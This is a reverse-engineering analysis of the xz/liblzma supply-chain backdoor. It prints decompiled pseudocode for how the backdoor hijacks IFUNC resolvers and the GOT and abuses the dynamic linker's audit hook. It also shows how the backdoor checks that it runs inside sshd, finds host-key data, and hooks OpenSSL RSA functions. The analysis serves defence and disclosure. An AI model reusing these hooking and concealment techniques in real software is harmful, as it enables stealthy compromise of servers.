# `liblzma.so` infection

The process of infecting `liblzma.so` with backdoor code is well documented in [1]. In this document we focus on the backdoor itself and provide an in-depth analysis from both static and dynamic perspectives.

## Entry point

As a result of the build time infection as documented in [1], the backdoor hijacks the IFUNC resolvers of `lzma_crc32` and `lzma_crc64` of `liblzma.so`, i.e., `crc32_resolve` and `crc64_resolve`, to add a call to `get_cpuid` in place of an invocation of `cpuid`:

```c
crc64_func_type __cdecl crc64_resolve()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  v7 = __readfsqword(0x28);
  // malicious function
  if ( !get_cpuid(1, index, v3, &v4, v5, v6) )
    return crc64_generic;
  v0 = crc64_arch_optimized;
  if ( (v4 & 0x80202) != 0x80202 )
    return crc64_generic;
  return v0;
}
```

This call facilitates the set-up and transition to the backdoor's main functionality. In the remainder of this document we take a deep-dive into the functionality of `get_cpuid`; our analysis is based on the following samples:

| File                      | SHA256                                                             |
| ------------------------- | ------------------------------------------------------------------ |
| `liblzma.so.5.6.1`        | `257fc477b9684863e0822cbad3606d76c039be8dd51cdc13b73e74e93d7b04cc` |
| `liblzma_la_crc64_fast.o` | `cbeef92e67bf41ca9c015557d81f39adaba67ca9fb3574139754999030b83537` |

## Installation of the hook for `cpuid`

The `get_cpuid` function calls `bd_set_cpuid_hook` function, which then calls `bd_init` if called via `crc64_resolve`:

```c
uint64_t __fastcall bd_set_cpuid_hook(unsigned int a1, _DWORD *a2)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  // crc32_resolve: g_counter will be incremented and
  // the original cpuid will be invoked

  // crc64_resolve: hook will be installed
  if ( g_counter == 1 )
  {
    ctx.static_label = 1;
    memset(&ctx.runtime_offset, 0, 32);
    ctx.return_address = a2;
    bd_init(&ctx, a2);
  }
  ++g_counter;
  cpuid(a1, &res, v4, v5, &ctx);
  return res;
}
```

Note that `g_counter` is shared between `crc32_resolve` and `crc64_resolve`; `crc32_resolve` increments the counter first, then when `crc64_resolve` executes, the check `g_counter == 1` succeeds and the backdoor executes.

The pseudocode of `bd_init` function is shown below:

```c
uint64_t __fastcall bd_init(bd_hook_ctx *hook_ctx, void *a2)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  hook_ctx->runtime_label = hook_ctx;
  bd_hook_ctx_init(hook_ctx);
  hook_ctx->return_address = hook_ctx->result_ptr;
  runtime_offset = hook_ctx->static_label - hook_ctx->runtime_label;
  hook_ctx->runtime_offset = runtime_offset;
  cpuid_got_ptr_is_null = g_ptrs_table.cpuid_got_ptr + runtime_offset == 0;
  cpuid_got_ptr = (g_ptrs_table.cpuid_got_ptr + runtime_offset);
  hook_ctx->result_ptr = cpuid_got_ptr;
  if ( !cpuid_got_ptr_is_null )
  {
    v7 = cpuid_got_ptr;
    v6 = *cpuid_got_ptr;
    // replace cpuid with bd_cpuid_hook
    *cpuid_got_ptr = g_ptrs_table.bd_cpuid_hook + runtime_offset;
    // call to bd_cpuid_hook (0x6F60)
    runtime_offset = cpuid(hook_ctx, a2, cpuid_got_ptr, &g_ptrs_table, index);
    *v7 = v6;
  }
  return runtime_offset;
}
```

As we can see, the `cpuid` function pointer in `.got` will be overwritten by with the `bd_cpuid_hook` function pointer and during a the next call to `cpuid`, control will pass to the `bd_cpuid_hook` function.

We consider this function as the _real_ entry point of the backdoor.

## Backdoor entry point analysis

```c
// backdoor entry point
uint64_t __fastcall bd_cpuid_hook(bd_hook_ctx *hook_ctx)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  // zeromem
  index = 0x22;
  table = &ftable;
  while ( index )
  {
    LODWORD(table->start) = 0;
    table = (bd_ftable *)((char *)table + 4);
    --index;
  }
  // zeromem
  current = &input;
  for ( i = 0x22; i; --i )
  {
    LODWORD(current->start) = 0;
    current = (install_input *)((char *)current + 4);
  }
  lzma_check_init(&input.lzma_check_state, 0);// LZMA_CHECK_NONE
  status = bd_ftable_init(&ftable);
  do
  {
    if ( !status )
    {
      input.ftable = bd_ftable;
      input.ctx = ctx;
      input.hook_ctx = hook_ctx;
      return bd_install_it_all(&input);
    }
    ftable.result = ctx;
    status = bd_ftable_init(bd_ftable);
  }
  while ( status != 5 );
  hook_ctx->static_label = 1;
  hook_ctx->runtime_offset = 0;
  hook_ctx->result_ptr = 0;
  hook_ctx->cpuid_ptr = 0;
  hook_ctx->runtime_label = 0;
  _RAX = 0;
  __asm { cpuid }
  if ( _RAX )
  {
    _RAX = 1;
    __asm { cpuid }
    LODWORD(hook_ctx->runtime_offset) = _RAX;
    LODWORD(hook_ctx->result_ptr) = _RBX;
    LODWORD(hook_ctx->cpuid_ptr) = _RCX;
    LODWORD(hook_ctx->runtime_label) = _RDX;
  }
  return 0;
}
```

This function contains two child functions:

- `bd_ftable_init` - performs initialisation of a table of function pointers (`struct bd_ftable`) used for subsequent hooks
- `bd_install_it_all` - performs additional set-up logic (structures initialisation, conditions checking, self checking, imports resolution, `_dl_audit_symbind_alt` (`afct`) hook installation, secret_data calculation, etc.)

## `bd_ftable_init`

The pseudocode for `bd_ftable_init` function is shown below:

```c
uint64_t __fastcall bd_ftable_init(bd_ftable *bd_table)
{
  uint64_t result; // rax

  result = 5;
  if ( bd_table )
  {
    bd_table->g_api_ctx = &g_api_ctx;
    result = 0;
    if ( !bd_table->result )
    {
      bd_table->value = 4;
      bd_table->install_hooks = install_hooks;
      bd_table->RSA_public_decrypt_hook = RSA_public_decrypt_hook;
      bd_table->RSA_get0_key_hook = RSA_get0_key_hook;
      bd_table->handle_logging = handle_logging;
      bd_table->mm_answer_keyallowed_hook = mm_answer_keyallowed_hook;
      bd_table->change_unknown_to_publickey = change_unknown_to_publickey;
      return 101;
    }
  }
  return result;
}
```

In this function, the backdoor initialises the `bd_ftable` structure which contains several important function pointers, e.g.:

- functions used in the hook installation process (`install_hooks`)
- hook functions for `openssl::RSA_public_decrypt`, `openssl::RSA_get0_key`, `sshd::mm_answer_keyallowed`, `sshd::mm_log_hander`
- and other functions used in the process of backdoor operation

We will describe some of these functions later in this report.

## `bd_install_it_all`

The pseudocode of the first part of this function is shown below:

```c
  ...
  hook_ctx = input->hook_ctx;
  elf_info_list.sshd_elf_info_p = &sshd_elf_info;
  elf_info_list.ld_elf_info_p = &ld_elf_info;
  elf_info_list.libc_elf_info_p = &libc_elf_info;
  strtab = 0LL;
  rela_plt_for_RSA_public_decrypt = 0LL;
  rela_plt_for_EVP_PKEY_set1_RSA = 0LL;
  rela_plt_for_RSA_get0_key = 0LL;
  libc_stack_end = 0LL;
  elf_info_list.liblzma_elf_info_p = &liblzma_elf_info;
  elf_info_list.libcrypto_elf_info_p = &libcrypto_elf_info;
  elf_info_list.maps = &elfs;
  elf_info_list.self = &elf_info_list;

  reinitialise_hook_ctx(hook_ctx);
  ptrb = LOBYTE(l_hook_ctx->result_ptr);
  runtime_offset = l_hook_ctx->runtime_offset;
  l_hook_ctx->cpuid_ptr = ptrb;

  // contains ld_linux_x86_64.so:__tls_get_addr
  tls_get_addr = *(runtime_offset + 8 * ptrb + 24);

  // contains return address from liblzma.so:crc64_resolve
  return_address = l_hook_ctx->return_address;
  diff = return_address - tls_get_addr;

  if ( tls_get_addr >= return_address )
    diff = tls_get_addr - return_address;
  if ( diff > 0x50000 )
    goto _bd_check_failed;

  ld_ehdr = (tls_get_addr & 0xFFFFFFFFFFFFF000LL);
  end_ehdr_search = ld_ehdr - 0x20000;

  // locate ld_linux_x86_64.so base (ELF header) in process memory
  while ( reverse_trie_lookup(ld_ehdr, 0LL) != STR__ELF )
  {
    ld_ehdr -= 4096;
    if ( ld_ehdr == end_ehdr_search )
      goto _bd_check_failed;
  }

  elf_invoke_input.elf_info_list = &elf_info_list;
  elf_invoke_input.libc_stack_end = &libc_stack_end;
  hctx = input->hook_ctx;
  elf_invoke_input.ehdr = ld_ehdr;
  elf_invoke_input.return_address = hctx->return_address;

  // check process name, arguments and environment variables
  if ( check_conditions(&elf_invoke_input) == Error )
    goto _bd_check_failed;
  ...
```

Here, the backdoor performs the following actions:

- it checks its location in memory by comparing `tls_get_addr` address with the return address from `crc64_resolve`:

  ```c
  if ( tls_get_addr >= return_address )
    diff = tls_get_addr - return_address;
  if ( diff > 0x50000 )
    goto _bd_check_failed;
  ```

- it searches for the base address of the ld library in process memory:

  ```c
  // locate ld_linux_x86_64.so base (ELF header) in process memory
  while ( reverse_trie_lookup(ld_ehdr, 0LL) != STR__ELF )
  {
    ld_ehdr -= 4096;
    if ( ld_ehdr == end_ehdr_search )
      goto _bd_check_failed;
  }
  ```

- it uses the `check_conditions` function to check the following conditions:
  - the name of the target process is equal to `/usr/sbin/sshd`
  - the process started with at least one argument, but not with the `-d` argument
  - the process does not contain environment variables that are contained in the list of decoded strings [2]:
    - `DISPLAY=`
    - `LD_AUDIT=`
    - `LD_BIND_NOT=`
    - `LD_DEBUG=`
    - `LD_PROFILE=`
    - `LD_USE_LOAD_BIAS=`
    - `LINES=`
    - `TERM=`
    - `WAYLAND_DISPLAY=`
    - `yolAbejyiejuvnup=Evjtgvsh5okmkAvj`

We suspect that the value `yolAbejyiejuvnup=Evjtgvsh5okmkAvj` was added to the strings table as a means to provide a kill switch, i.e., to prevent the backdoor from initialising. However, as there are no references to it in the code, we cannot be sure. What we did find, however, was that any string in the prefix trie listed [here](https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01) without whitespace characters can be used as a kill switch.

The pseudocode of the `check_conditions` function is shown below:

```c
Status __fastcall check_conditions(elf_invoke_input *input)
{
  Elf64_Sym *libc_stack_end_sym; // rax
  elf_info_t *elf_info; // rdi
  void **libc_stack_end_off; // r12

  if ( parse_elf(input->ehdr, input->elf_info_list->ld_elf_info_p) == Error )
    return Error;
  libc_stack_end_sym = import_lookup(input->elf_info_list->ld_elf_info_p, STR___libc_stack_end_, STR_GLIBC_2_2_5_);
  if ( !libc_stack_end_sym )
    return Error;
  elf_info = input->elf_info_list->ld_elf_info_p;
  libc_stack_end_off = &elf_info->ehdr->e_ident[libc_stack_end_sym->st_value];
  if ( check_sshd_process(elf_info, *libc_stack_end_off) == Error )
    return Error;
  *input->libc_stack_end = *libc_stack_end_off;
  return Success;
}
```

The checks inside `check_sshd_process` are performed by parsing data located at `libc_stack_end + 8`:

```
[stack]:00007FFFFFFFE550 libc_stack_end  dq 2                    ; DATA XREF: ld_linux_x86_64.so.2:__libc_stack_end↑o
[stack]:00007FFFFFFFE558 process_info    dq offset aUsrSbinSshd  ; DATA XREF: libc.so.6:__libc_argv↑o
[stack]:00007FFFFFFFE558                                         ; ld_linux_x86_64.so.2:_dl_argv↑o
[stack]:00007FFFFFFFE558                                         ; "/usr/sbin/sshd"
[stack]:00007FFFFFFFE560                 dq offset asc_7FFFFFFFE7AA ; "-h"
[stack]:00007FFFFFFFE568                 dq 0
[stack]:00007FFFFFFFE570                 dq offset aShellBinBash ; "SHELL=/bin/bash"
[stack]:00007FFFFFFFE578                 dq offset aSudoGid1000  ; "SUDO_GID=1000"
```

The process of ELF parsing (`parse_elf`) and symbols resolution (`import_lookup`) is documented in [primitives](#elf-parsing).

Following condition checks, the backdoor initialises the `shared_objects_ctx` structure:

```c
...
so_ctx.maps = &elfs;
so_ctx.rela_plt_for_RSA_public_decrypt = &rela_plt_for_RSA_public_decrypt;
so_ctx.rela_plt_for_EVP_PKEY_set1_RSA = &rela_plt_for_EVP_PKEY_set1_RSA;
so_ctx.rela_plt_for_RSA_get0_key = &rela_plt_for_RSA_get0_key;

ftable = input->ftable;
so_ctx.elf_info_list = &elf_info_list;
all_p = ftable->all_p;
so_ctx.standard = &standard;
so_ctx.all_p = all_p;

if ( process_shared_objects(&so_ctx) == Error )
...
```

The pseudocode for the `process_shared_objects` function is shown below:

```c
Status __fastcall process_shared_objects(shared_objects_ctx *so_ctx)
{
  Elf64_Sym *sym; // rax
  uint32_t status; // edx
  r_debug *r_debug; // rax
  maps_list_t *maps; // rdx
  struct link_map *r_map; // rdi
  shared_objects_ctx so_ctx_copy; // [rsp+8h] [rbp-40h] BYREF

  sym = import_lookup(so_ctx->elf_info_list->ld_elf_info_p, STR__r_debug_, STR_GLIBC_2_2_5_);
  status = 0;
  if ( sym )
  {
    r_debug = &so_ctx->elf_info_list->ld_elf_info_p->ehdr->e_ident[sym->st_value];
    status = 0;
    if ( r_debug->r_version > 0 )
    {
      maps = so_ctx->maps;
      r_map = r_debug->r_map;
      so_ctx_copy.elf_info_list = so_ctx->elf_info_list;
      so_ctx_copy.maps = maps;
      so_ctx_copy.rela_plt_for_RSA_public_decrypt = so_ctx->rela_plt_for_RSA_public_decrypt;
      so_ctx_copy.rela_plt_for_EVP_PKEY_set1_RSA = so_ctx->rela_plt_for_EVP_PKEY_set1_RSA;
      so_ctx_copy.rela_plt_for_RSA_get0_key = so_ctx->rela_plt_for_RSA_get0_key;
      so_ctx_copy.all_p = so_ctx->all_p;
      so_ctx_copy.standard = so_ctx->standard;
      *&status = process_shared_objects_map(r_map, &so_ctx_copy) != Error;
    }
  }
  return status;
}
```

This function works to construct the following structures:

```c
struct maps_list_t
{
  link_map *sshd;
  link_map *ld_linux_x86_64;
  link_map *liblzma;
  link_map *libcrypto;
  link_map *libsystemd;
  link_map *libc;
};

struct elf_info_list_t
{
  elf_info_t *sshd_elf_info_p;
  elf_info_t *ld_elf_info_p;
  elf_info_t *libc_elf_info_p;
  elf_info_t *liblzma_elf_info_p;
  elf_info_t *libcrypto_elf_info_p;
  maps_list_t *maps;
  elf_info_list_t *self;
};

struct shared_objects_ctx
{
  maps_list_t *maps;
  elf_info_list_t *elf_info_list;
  uint64_t rela_plt_for_RSA_public_decrypt;
  uint64_t rela_plt_for_EVP_PKEY_set1_RSA;
  uint64_t rela_plt_for_RSA_get0_key;
  all_t *all_p;
  standard_funcs_t *standard;
};
```

Following this, the backdoor populates the structures with additional information about the strings used in the process memory. We document this in full in [primitives](#strings-references).

The pseudocode below summarises how this is done:

```c
...
get_string_refs(&sshd_elf_info, &string_refs);
liblzma_code_size = 0LL;
liblzma_code_start = get_code_start_and_size(elf_info_list.liblzma_elf_info_p, &liblzma_code_size);
if ( !liblzma_code_start )
  goto _to_exit;
all->g_ctx.liblzma_code_start = liblzma_code_start;
sz5 = 0x4ELL;
all_c = all;
all->g_ctx.liblzma_code_end = liblzma_code_size + liblzma_code_start;
...
```

The next key part of the backdoor's execution is parsing the `dl_audit_symbind_alt` code to get the [afcl](https://github.com/bminor/glibc/blob/1f94147a79fcb7211f1421b87383cad93986797f/elf/dl-audit.c#L148) structure pointer.

```c
lzma_allocator = get_lzma_allocator();
lzma_allocator->opaque = elf_info_list.libc_elf_info_p;
malloc_usable_size = lzma_alloc(STR_malloc_usable_size_, lzma_allocator);
all->std.malloc_usable_size = malloc_usable_size;
if ( malloc_usable_size )
  ++LODWORD(all->std.count);

// add imports from libc
// add imports from libcrypto
// analyse dl_audit_symbind_alt() code to get afct pointer
if ( !parse_dl_audit_symbind_alt_and_add_imports(&elf_info_list.maps, &strtab, all, hfuncs) )
  goto _to_exit;

allocator = get_lzma_allocator();
RSA_get0_key_sym = elf_info_list.libcrypto_elf_info_p;
v167 = allocator;
allocator->opaque = elf_info_list.libcrypto_elf_info_p;
if ( RSA_get0_key_sym )
{
  RSA_get0_key_sym = import_lookup(RSA_get0_key_sym, STR_RSA_get0_key_, 0);
  v64 = lzma_alloc(STR_EVP_MD_CTX_new_, v167);
  all->EVP_MD_CTX_new = v64;
  if ( v64 )
    ++all->imports_count;
}
```

At the end of the `bd_install_it_all` function, the pointer of this structure will be overwritten to hijack the control flow of the `dl_audit_symbind_alt` function.

The backdoor then recovers the addresses of strings, functions, and offsets that relate to the operation of the `sshd` process.
This information is used in subsequent hooks.
We show the code responsible for this process below:

```c
...
if ( all->BN_bn2bin )
  ++all->imports_count;
RSA_sign_sym_copy = RSA_sign_sym;

// handle list of functions for secret data update
// get imports from libcrypto
// get sensitive_data.host_keys pointer from sshd
if ( install_entries(elf_info_list.sshd_elf_info_p, elf_info_list.libcrypto_elf_info_p, &string_refs, hfuncs, g_ctx_p) == Error )
  goto _to_exit;

libcrypto_einfo = elf_info_list.libcrypto_elf_info_p;

if ( BN_bin2bn_sym )
{
  BN_bin2bn = &elf_info_list.libcrypto_elf_info_p->ehdr->e_ident[BN_bin2bn_sym->st_value];
  ++all->imports_count;
  all->BN_bin2bn = BN_bin2bn;
}
...
data_segment = elf_get_data_segment(sshd_elf_info_p, &insn.addr, 0);
if ( data_segment )
{
  addr = insn.addr;
  if ( string_refs.refs[I2S_mm_request_send_].code_start )
  {
    ssh_ctx->mm_request_send = string_refs.refs[I2S_mm_request_send_].code_start;
    ssh_ctx->mm_request_receive = string_refs.refs[I2S_mm_request_send_].code_end;
    LODWORD(sid) = STR_password_;
    str_password = prefix_trie_decode(sshd_elf, &sid, 0LL);
    ssh_ctx->str_password_ptr = str_password;
    if ( str_password
      && get_checked_reloc_for_symbol(
            I2S_mm_answer_authpassword_,
            &ssh_ctx->mm_answer_authpassword_start,
            &ssh_ctx->mm_answer_authpassword_end,
            &ssh_ctx->reloc_for_mm_answer_authpassword,
            sshd_elf,
            &string_refs,
            &g_ctx_p->sshd_main_verified) == Error )
    {
      ssh_ctx->mm_answer_authpassword_start = 0LL;
      ssh_ctx->mm_answer_authpassword_end = 0LL;
      ssh_ctx->reloc_for_mm_answer_authpassword = 0LL;
    }
    LODWORD(sid) = STR_publickey_;
    str_publickey = prefix_trie_decode(sshd_elf, &sid, 0LL);
    ssh_ctx->str_publickey = str_publickey;
    if ( str_publickey )
    {
      if ( get_checked_reloc_for_symbol(
              I2S_mm_answer_keyallowed_,
              &ssh_ctx->mm_answer_keyallowed_start,
              &ssh_ctx->mm_answer_keyallowed_end,
              &ssh_ctx->reloc_for_mm_answer_keyallowed,
              sshd_elf,
              &string_refs,
              &g_ctx_p->sshd_main_verified) )
      {
        if ( get_checked_reloc_for_symbol(
                I2S_mm_answer_keyverify_,
                &ssh_ctx->mm_answer_keyverify_start,
                &ssh_ctx->mm_answer_keyverify_end,
                &ssh_ctx->reloc_for_mm_answer_keyverify,
                sshd_elf,
                &string_refs,
                &g_ctx_p->sshd_main_verified) == Error )
        {
          ssh_ctx->mm_answer_keyverify_start = 0LL;
          ssh_ctx->mm_answer_keyverify_end = 0LL;
          ssh_ctx->reloc_for_mm_answer_keyverify = 0LL;
        }
      }
      else
      {
        ssh_ctx->mm_answer_keyallowed_start = 0LL;
        ssh_ctx->mm_answer_keyallowed_end = 0LL;
        ssh_ctx->reloc_for_mm_answer_keyallowed = 0LL;
      }
    }
...
```

With this code, the backdoor populates two data structures and the global context used in the main hook function (`RSA_public_decrypt_hook -> hook_main`):

```c
struct ssh_logs
{
  uint32_t used;
  uint32_t mm_log_hander_checked;
  uint32_t value0;
  uint32_t value1;
  char *str__s_key_ptr;                 ///< %s key
  char *str__connection_closed_by_ptr;  ///< Connection closed by %s
  char *str_preauth_ptr;                ///< preauth]
  char *str_authenticating_ptr;         ///< authenticating
  char *str_user_group_ptr;             ///< user:group %u:%u
  char *func_mm_log_hander_ptr;         ///< mm_log_hander() ptr
  uint64_t mm_log_hander_hook_p;
  uint64_t mm_log_hander_original;
  uint64_t mm_log_hander_hook;
  void *func_sshlogv;                   ///< sshlogv()
  void *handle_logging;                 ///< 0xA3D0 func
  uint64_t value4;                      ///< 0xA40
};

struct ssh_ctx
{
  uint32_t mm_answer_keyverify_value;   ///< 0x100000001
  uint32_t str_unknown_ptr_is_null;
  uint32_t mm_answer_keyverify_is_not_null;
  uint32_t value0;
  Status (__fastcall *change_unknown_to_password)(uint64_t flag0, int fd, uint64_t flag1);
  void *mm_answer_keyallowed_hook;
  Status (__fastcall *change_unknown_to_publickey)(uint64_t flag, char *buffer);
  uint8_t *mm_answer_authpassword_start;
  uint8_t *mm_answer_authpassword_end;
  uint8_t *reloc_for_mm_answer_authpassword;
  uint64_t value1;                      ///< 0x00
  uint8_t *mm_answer_keyallowed_start;
  uint8_t *mm_answer_keyallowed_end;
  uint64_t reloc_for_mm_answer_keyallowed;
  uint64_t value2;                      ///< 0x00
  uint8_t *mm_answer_keyverify_start;
  uint8_t *mm_answer_keyverify_end;
  uint8_t *reloc_for_mm_answer_keyverify;
  uint32_t value3;
  uint16_t buffer_size;
  uint16_t value4;
  uint64_t current_buffer;
  uint64_t value5;
  uint8_t *unknown_to_password_buf;
  char *str_unknown_ptr;
  void *mm_request_send;
  void *mm_request_receive;
  uint64_t flag;                        ///< 0x01
  uint64_t *start_pam_displ;
  uint64_t *auth_root_allowed_displ;
  char *str_password_ptr;
  char *str_publickey;
};
```

It should be noted that in the `install_entries` function, the backdoor obtains a pointer of the `sensitive_data` structure using analysis of x-refs for the following strings:

- `xcalloc: zero size`
- `KRB5CCNAME`

The code pattern that is responsible for this is shown below:

```c
  // get sensitive_data.host_keys pointer from sshd
  res = handle_calloc_zero_size_caller(data_segment, &data_segment[size], address, *ssh_code_end, string_refs, &displ);
  v18 = handle_func_with_krb5ccname_ref(data_segment, &data_segment[size], address, *ssh_code_end, &addr, sshd_elf_info);
  v19 = lzma_alloc(STR_EVP_chacha20_, v25);
  hfuncs->EVP_chacha20 = v19;
  if ( v19 )
    ++hfuncs->count;
  if ( !res )
  {
    if ( !v18 )
    {
_free:
      lzma_free(hfuncs->EVP_DigestVerifyInit, v25);
      lzma_free(hfuncs->EVP_CIPHER_CTX_new, v25);
      lzma_free(hfuncs->EVP_chacha20, v25);
      return Error;
    }
    res0 = 0;
    goto _label1;
  }
  if ( !v18 )
  {
    res0 = value_from_strings_refs_check(displ, sshd_elf_info, string_refs);
    res1 = 0;
    goto _label2;
  }
  g_sensitive_data = displ;
  if ( displ != addr )
  {
    res0 = value_from_strings_refs_check(displ, sshd_elf_info, string_refs);
_label1:
    res1 = value_from_strings_refs_check(addr, sshd_elf_info, string_refs);
_label2:
    if ( res0 >= res1 && res0 > 7 )
    {
      g_sensitive_data = displ;
      goto _set_structure;
    }
    if ( res1 >= res0 && res1 > 7 )
    {
      g_sensitive_data = addr;
      goto _set_structure;
    }
    goto _free;
  }
  if ( value_from_strings_refs_check(displ, sshd_elf_info, string_refs) > 7 )
  {
_set_structure:
    g_ctx->sensitive_data = g_sensitive_data;
    return Success;
  }
```

In this snippet, the backdoor locates the [following code](https://github.com/openssh/openssh-portable/blob/88351eca17dcc55189991ba60e50819b6d4193c1/sshd.c#L1831) and saves the `sensitive_data *sensitive_data` structure pointer to the global context structure.
This structure is actively used in `hook_main` function.

And at the end of the `bd_table_init` function, the backdoor installs a hook for `_dl_audit_symbind_alt`:

```c
all->ftable_install_hooks = input->ftable->install_hooks;
*all->afct_ptr = &all->afct_new_label;
allocc = alloc;
*all->afct_installed = 1;
```

Within this hook, the backdoor overwrites a pointer in `afct`, so that `afct->symbind` will point to `install_hooks` (`.text.lz_encoder_prepara:00000000000028C0`):

- https://github.com/bminor/glibc/blob/1f94147a79fcb7211f1421b87383cad93986797f/elf/dl-audit.c#L148
- https://github.com/bminor/glibc/blob/1f94147a79fcb7211f1421b87383cad93986797f/elf/dl-audit.c#L159C1-L162C44

As a result, during the execution of the following code inside `_dl_audit_symbind_alt`, the backdoor's `install_hooks` function will be called:

```c
uintptr_t new_value = afct->symbind (&sym, ndx,
              &match_audit->cookie,
              &result_audit->cookie,
              &flags, strtab + ref->st_name);
```

In case of any unsuccessful operations inside `bd_install_it_all`, the `dl_audit_hook_uninstall` function will be called (located at `.text.lzma_block_buffer_bound63:0000000000002760` in object file).

## install_hooks

The pseudocode of the function that sets the hooks in the context of the `_dl_audit_symbind_alt` function is as follows:

```c
uint64_t __fastcall install_hooks(Elf64_Sym *sym, __int64 a2, __int64 a3, __int64 a4, __int64 a5, unsigned __int8 *a6)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  api_ctx = g_all;
  hfuncs = g_all->hfuncs;
  if ( !LODWORD(g_all->hook_setup_finished) )
  {
    dl_audit_symbind_alt = g_all->dl_audit_symbind_alt;
    libc_stack_end = g_ctx->standard->libc_stack_end;
    if ( dl_audit_symbind_alt >= retaddr
      || g_all->dl_audit_symbind_alt_sym_st_size + dl_audit_symbind_alt < retaddr - dl_audit_symbind_alt )
    {
      goto _finish;
    }
    sid = reverse_trie_lookup(a6, 0LL);
    RSA_public_decrypt_hook_ptr = hfuncs->RSA_public_decrypt_hook_ptr;
    if ( sid == STR_RSA_public_decrypt_ && RSA_public_decrypt_hook_ptr )
    {
      if ( *RSA_public_decrypt_hook_ptr > 0xFFFFFF )
      {
        // rewrite RSA_public_decrypt pointer
        hfuncs->RSA_public_decrypt = *RSA_public_decrypt_hook_ptr;
        RSA_public_decrypt_hook = api_ctx->RSA_public_decrypt_hook;
        *RSA_public_decrypt_hook_ptr = RSA_public_decrypt_hook;
        if ( sym > retaddr && sym < libc_stack_end )
          sym->st_value = RSA_public_decrypt_hook;
      }
      goto _update_api_ctx;
    }
    evp_pkey_set1_rsa_hook_ptr = hfuncs->EVP_PKEY_set1_RSA_hook_ptr_null;
    if ( evp_pkey_set1_rsa_hook_ptr && sid == STR_EVP_PKEY_set1_RSA_ )
    {
      if ( *evp_pkey_set1_rsa_hook_ptr <= 0xFFFFFF )
        goto _update_api_ctx;
      // rewrite EVP_PKEY_set1_RSA pointer
      hfuncs->EVP_PKEY_set1_RSA_null = *evp_pkey_set1_rsa_hook_ptr;
      EVP_PKEY_set1_RSA_hook = api_ctx->EVP_PKEY_set1_RSA_hook;
      *evp_pkey_set1_rsa_hook_ptr = EVP_PKEY_set1_RSA_hook;
      if ( sym > retaddr && sym < libc_stack_end )
        sym->st_value = EVP_PKEY_set1_RSA_hook;
      RSA_get0_key_hook_ptr_null = hfuncs->RSA_get0_key_hook_ptr_null;
      if ( !RSA_get0_key_hook_ptr_null )
        goto _update_api_ctx;
      hook = *RSA_get0_key_hook_ptr_null <= 0xFFFFFFuLL;
    }
    else
    {
      rsa_get0_key_hook_ptr = hfuncs->RSA_get0_key_hook_ptr_null;
      if ( sid != STR_RSA_get0_key_ || !rsa_get0_key_hook_ptr )
        return sym->st_value;
      if ( *rsa_get0_key_hook_ptr <= 0xFFFFFF )
        goto _update_api_ctx;
      // rewrite RSA_get0_key pointer
      hfuncs->RSA_get0_key_null = *rsa_get0_key_hook_ptr;
      RSA_get0_key = api_ctx->RSA_get0_key_;
      *rsa_get0_key_hook_ptr = RSA_get0_key;
      if ( sym > retaddr && sym < libc_stack_end )
        sym->st_value = RSA_get0_key;
      if ( !evp_pkey_set1_rsa_hook_ptr )
        goto _update_api_ctx;
      hook = *evp_pkey_set1_rsa_hook_ptr <= 0xFFFFFF;
    }
    if ( !hook )
    {
_update_api_ctx:
      dl_audit_hook_uninstall(api_ctx);
_finish:
      LODWORD(api_ctx->hook_setup_finished) = 1;
    }
  }
  return sym->st_value;
}
```

This function attempts to set hooks on three functions from `libcrypto`. After the first successful hook has been set, `_dl_audit_symbind_alt` will be uninstalled.

The three possible hooks are as follows:

- `RSA_public_decrypt`: `RSA_public_decrypt_hook` (`.text.lzma_index_prealloa:000000000000A270`):

  ```c
  int __fastcall RSA_public_decrypt_hook(unsigned int flen, uint8_t *from, uint8_t *to, RSA *r)
  {
    hfuncs_t *hfuncs; // rax
    int (__fastcall *RSA_public_decrypt_orig_func)(int, unsigned __int8 *, unsigned __int8 *, RSA *, int); // r14
    int result; // eax
    RSA *key; // [rsp+0h] [rbp-48h]
    uint32_t status; // [rsp+1Ch] [rbp-2Ch] BYREF

    if ( !g_ctx )
      return 0;
    hfuncs = g_ctx->hfuncs;
    if ( !hfuncs )
      return 0;
    RSA_public_decrypt_orig_func = hfuncs->RSA_public_decrypt;
    if ( !hfuncs->RSA_public_decrypt )
      return 0;
    if ( !r )
      return (RSA_public_decrypt_orig_func)(flen, from, to, r);
    key = r;
    status = 1;
    result = hook_main(r, g_ctx, &status);
    r = key;
    if ( status )
      return (RSA_public_decrypt_orig_func)(flen, from, to, r);
    return result;
  }
  ```

- `RSA_get0_key`: `RSA_get0_key_hook` (`.text.lzma_index_inia:000000000000A360`):

  ```c
  void __fastcall RSA_get0_key_hook(RSA *r, BIGNUM **n, BIGNUM **e)
  {
    hfuncs_t *hfuncs; // rax
    void (__fastcall *RSA_get0_key_orig_func)(const RSA *, const BIGNUM **, const BIGNUM **, const BIGNUM **); // r14
    uint32_t *status; // [rsp+1Ch] [rbp-1Ch] BYREF

    if ( g_ctx )
    {
      hfuncs = g_ctx->hfuncs;
      if ( hfuncs )
      {
        RSA_get0_key_orig_func = hfuncs->RSA_get0_key_null;
        if ( RSA_get0_key_orig_func )
        {
          if ( r )
            hook_main(r, g_ctx, &status);
          (RSA_get0_key_orig_func)(r, n, e);
        }
      }
    }
  }
  ```

- `EVP_PKEY_set1_RSA`: `EVP_PKEY_set1_RSA_hook` (`.text.lzma_index_memusaga:000000000000A300`):

  ```c
  int __fastcall EVP_PKEY_set1_RSA_hook(EVP_PKEY *pkey, RSA *r)
  {
    hfuncs_t *hfuncs; // rax
    int (__fastcall *EVP_PKEY_set1_RSA_null)(EVP_PKEY *, struct rsa_st *); // r12
    uint32_t *status; // [rsp+Ch] [rbp-1Ch] BYREF

    if ( !g_ctx )
      return 0;
    hfuncs = g_ctx->hfuncs;
    if ( !hfuncs )
      return 0;
    EVP_PKEY_set1_RSA_null = hfuncs->EVP_PKEY_set1_RSA_null;
    if ( !EVP_PKEY_set1_RSA_null )
      return 0;
    if ( r )
      hook_main(r, g_ctx, &status);
    return EVP_PKEY_set1_RSA_null(pkey, r);
  }
  ```

